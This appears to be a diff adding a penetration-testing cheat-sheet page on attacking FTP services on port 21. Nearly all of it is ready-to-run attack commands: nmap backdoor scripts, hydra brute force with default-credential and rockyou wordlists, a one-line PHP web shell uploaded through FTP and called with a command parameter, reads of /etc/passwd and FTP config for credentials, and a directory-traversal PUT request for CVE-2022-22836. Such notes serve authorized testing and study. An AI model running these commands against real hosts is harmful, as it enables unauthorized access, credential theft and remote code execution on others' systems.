@@ -1,0 +1,101 @@
+# FTP (21)
+
+!!! tip "Start here"
+    Always try anonymous login first. If you get in, check for write access, if the FTP root maps to a web directory, it's a direct file upload path.
+
+---
+
+## Enumeration
+
+```bash
+nmap -p 21 --script ftp-anon,ftp-bounce,ftp-syst,ftp-proftpd-backdoor,ftp-vsftpd-backdoor $IP
+```
+
+---
+
+## FTP Login Syntax
+
+```bash
+ftp user@IP
+```
+
+---
+
+## Anonymous Login
+
+```bash
+ftp anonymous@$IP
+# Password: anonymous OR anon
+
+ftp> ls -la
+ftp> ls -laR       # recursive listing
+```
+
+Mirror the entire directory without interacting manually:
+```bash
+wget -m --no-passive ftp://anonymous@$IP
+```
+
+---
+
+## Brute Force
+
+```bash
+hydra -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt ftp://$IP
+hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ftp://$IP
+```
+
+---
+
+## File Transfer
+
+```bash
+ftp> get filename        # download
+ftp> put filename        # upload
+ftp> type binary         # switch to binary mode for non-text files
+```
+
+---
+
+## Web Shell Upload
+
+If the FTP root maps to a web-accessible directory (`/var/www/html`):
+
+```bash
+# Create shell locally
+echo '<?php system($_GET["cmd"]); ?>' > shell.php
+
+# Upload via FTP
+ftp> put shell.php
+```
+
+Access at: `http://$IP/shell.php?cmd=id`
+
+!!! warning "Watch out"
+    Confirm the upload path is web-accessible before spending time on the shell. Upload a test file first and try to reach it over HTTP.
+
+---
+
+## Post-Exploitation
+
+If you've compromised the host, check FTP config for stored credentials:
+
+```bash
+cat /etc/vsftpd.conf
+grep ftp /etc/passwd
+```
+
+!!! tip "Real-world"
+    FTP is rarely exposed externally on modern networks, when you do see it, it's usually a legacy system or an oversight. Treat it as higher priority than it looks; misconfigured FTP on an internal network often has write access to paths that matter.
+
+---
+
+## Known Vulnerabilities
+
+### CVE-2022-22836
+
+CoreFTP Server version 727 and below is vulnerable to [CVE-2022-22836](https://www.exploit-db.com/exploits/50652), an authenticated exploit that allows for file directory traversal using a simple cURL request.
+
+```sh
+curl -k -X PUT -H "Host: <IP>" --basic -u <username>:<password> --data-binary "PoC." --path-as-is https://<IP>/../../../../../../whoops
+```
